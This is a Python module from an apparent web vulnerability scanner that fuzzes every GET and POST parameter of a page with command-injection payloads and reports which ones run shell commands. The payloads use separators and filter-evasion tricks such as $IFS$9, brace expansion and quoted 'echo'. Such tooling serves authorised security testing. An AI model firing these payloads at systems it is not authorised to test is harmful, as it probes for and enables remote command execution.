import asyncio
from typing import List

from .mod import Mod, Page, Report
from .requester import Requester

payloads = [
    (pattern.format(cmd), resp)
    for pattern in [
        "{}",
        "{}#",
        "{}\n",
        ";{};#",
        "\n{}\n#",
        "|{}#",
        "1145141919810;{};#",
        "1145141919810\n{}\n#",
        "1145141919810|{}#",
    ]
    for cmd, resp in [
        ("id", " gid="),
        ("mount", "on / type ext4"),
        *[
            (pattern.replace("ECHO", echo), "yun tong")
            for pattern in [
                "ECHO yun  tong",
                "ECHO$IFS$9yun$IFS$9tong",
                r"{ECHO,yun,tong}"
            ]
            for echo in [
                "echo",
                "ec'h'o",
                "ec\"h\"o",
            ]
        ],
        # ("echo yun  tong", "yun tong"),
        # ("echo$IFS$9yun$IFS$9tong", "yun tong"),
        # ("{echo,yun,tong}", "yun tong"),
    ]
]



class ShellExecFuzzMod(Mod):
    def __init__(self, requester: Requester):
        super().__init__()
        self.requeser = requester

    async def check(self, thing):
        if not isinstance(thing, Page) or (not thing.params and not thing.data):
            return 0
        return 1

    async def test_payloads(self, page, method, param_field):
        target_params = page.params if method == "GET" else page.data

        return await asyncio.gather(
            *[
                self.requeser.submit_to(
                    page.url,
                    method,
                    {k: payload if k == param_field else "asdf" for k in target_params},
                )
                for payload, _ in payloads
            ]
        )

    async def crack_by_method(self, page, method):
        reports: List[Report] = []
        target_params = page.params if method == "GET" else page.data
        if not target_params:
            return []
        for param in target_params:
            results = await self.test_payloads(page, method, param)
            for (payload, payload_respond), resp in zip(payloads, results):
                if payload_respond not in resp.text:
                    continue
                reports.append(
                    Report(
                        msg=f"在页面 {page.url} 找到一个可以执行Shell命令的{method}参数{param}, payload为{repr(payload)}"
                    )
                )
                break
        return reports

    async def crack(self, page):
        assert isinstance(page, Page) and (page.params or page.data)
        reports_lists = await asyncio.gather(
            *[self.crack_by_method(page, method) for method in ["GET", "POST"]]
        )
        reports: List[Report] = [
            report for reports in reports_lists for report in reports
        ]

        return reports
